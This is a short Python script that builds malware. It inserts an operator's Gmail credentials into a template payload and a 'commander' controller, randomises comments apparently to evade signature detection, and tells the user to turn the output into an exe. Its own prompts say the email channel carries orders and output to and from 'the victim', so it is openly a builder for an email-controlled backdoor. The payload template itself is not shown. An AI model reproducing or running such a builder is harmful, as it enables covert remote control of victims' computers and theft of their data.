import random
def randomCommentGenerator():
    l=random.randint(10,25)
    comment="#"
    for i in range(l):
        if i==0:
            t=random.randint(0,1)
        else:
            t=random.randint(0,2)
        if t==0:
            x=random.randint(97,122)
        if t==1:
            x=random.randint(65,90)
        if t==2:
            x=random.randint(48,57)
        comment+=chr(x)
    return comment

f=open("code.txt",'r')
code=f.read()
email=input("Enter the Email address you want to use to send/recieve orders/output to/from the victim: \n Use a gmail and enable it's less secure applications features")
password=input("Enter your Email password: ")
code=code.replace("Email_Address",email)
code=code.replace("Email_Password",password)
print("Generating random comments")
for i in range(0,111):
    code=code.replace("#"+str(i),randomCommentGenerator(),1)
f.close()
f=open('vv.py','w')
f.write(code)
f.close()
print("Your file 'vv.py is ready'")
print("Use http://pytoexe.com/ to transfer you python file into an exe")


f=open("code2.txt",'r')
code=f.read()
code=code.replace("Email_Address",email)
code=code.replace("Email_Password",password)
f.close()
f=open('commander.py','w')
f.write(code)
f.close()
